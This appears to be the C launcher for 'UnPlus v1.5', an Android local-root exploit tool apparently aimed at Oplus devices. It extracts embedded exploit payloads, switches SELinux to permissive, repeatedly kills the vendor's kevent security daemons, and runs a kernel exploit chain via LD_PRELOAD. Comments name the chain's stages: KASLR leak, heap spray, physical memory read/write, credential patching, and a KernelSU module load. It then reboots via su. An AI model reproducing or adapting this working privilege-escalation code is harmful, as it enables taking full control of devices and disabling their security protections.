#include "payload/payload_data.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>

/* Payload paths — device-side (must match src/root.c and embed_payloads.py).
 * These are the runtime paths where payloads are extracted to on the device. */
#define PAYLOAD_DIR          "/data/local/tmp"
#define UNPLUS_EXPLOIT_BIN   PAYLOAD_DIR "/unplus_exploit"
#define UNPLUS_PRELOAD_LIB   PAYLOAD_DIR "/unplus_preload.so"
#define KSUD_BIN             PAYLOAD_DIR "/ksud"

static int write_file(const char *path, const uint8_t *data, size_t len) {
  FILE *fp = fopen(path, "wb");
  if (!fp) {
    fprintf(stderr, "! open %s: %s\n", path, strerror(errno));
    return 0;
  }
  if (fwrite(data, 1, len, fp) != len) {
    fprintf(stderr, "! write %s failed\n", path);
    fclose(fp);
    return 0;
  }
  fclose(fp);
  return 1;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("  __  __          __\n");
  printf(" / / / /__  ___  / /_ _____\n");
  printf("/ /_/ / _ \\/ _ \\/ / // (_-<\n");
  printf("\\____/_//_/ .__/_/\\_,_/___/\n");
  printf("         /_/\n");
  printf("        UnPlus v1.5\n\n");

  printf("[1/4] Extracting...\n");
  for (int i = 0; i < PAYLOAD_COUNT; i++) {
    if (!write_file(payloads[i].dest_path, payloads[i].data, payloads[i].size))
      return 1;
    if (payloads[i].is_exec)
      chmod(payloads[i].dest_path, 0755);
    printf("  %s (%zu bytes)\n", payloads[i].name, payloads[i].size);
  }

  printf("[2/4] SELinux -> permissive...\n");
  int selinux_ok = system(UNPLUS_EXPLOIT_BIN " --step=1") == 0;
  printf("  %s\n", selinux_ok ? "done" : "FAILED");

  /* Kill Oplus kevent daemons aggressively.
   * init may restart them; loop-kill to exhaust the restart window. */
  for (int i = 0; i < 8; i++)
    system("killall -9 oplus_kevent bsp_kevent 2>/dev/null");

  printf("[3/4] Root + policy + guards + KSU + enforcing...\n");
  pid_t pid = fork();
  if (pid == 0) {
    /* The preload constructor runs the full exploit chain here. Its stdout
     * and stderr are inherited from the wrapper so each stage's progress
     * (kaslr leak, heap spray, pipe physrw, cred patch, magiskpolicy,
     * allowlist, ksud insmod) is visible to the user. This does not hang
     * adb: the wrapper waitpid()s until this child fully exits, so by the
     * time the wrapper continues the child holds no file descriptors. */
    setenv("LD_PRELOAD", UNPLUS_PRELOAD_LIB, 1);
    execl("/system/bin/true", "true", (char *)NULL);
    _exit(1);
  } else if (pid > 0) {
    int status;
    waitpid(pid, &status, 0);
    int root_ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
    printf("[3/4] %s\n", root_ok ? "done" : "FAILED");
  }

  /* Clean up all payloads except ksud (still needed for step 4).
   * ksud's SELinux context was fixed by chcon in install_android_root
   * so it's executable under enforcing. */
  for (int i = 0; i < PAYLOAD_COUNT; i++) {
    if (strstr(payloads[i].dest_path, "/ksud")) continue;
    unlink(payloads[i].dest_path);
  }

  printf("[4/4] Soft-reboot via KSU...\n");
  /* KSU allowlist authorises uid 2000 → /system/bin/su grants root.
   * KSU's kernel module intercepts execve on known su paths, checks
   * the allowlist, and grants root. ksud is chcon'd (before insmod)
   * so it's executable under enforcing. */
  pid_t reboot_pid = fork();
  if (reboot_pid == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDWR);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
      dup2(null_fd, STDOUT_FILENO);
      dup2(null_fd, STDERR_FILENO);
      close(null_fd);
    }
    execl("/system/bin/su", "su", "-c",
          KSUD_BIN " soft-reboot", (char *)NULL);
    _exit(1);
  }

  printf("\n========================================\n");
  printf("  UnPlus finished — soft-rebooting now.\n");
  printf("========================================\n\n");
  return 0;
}
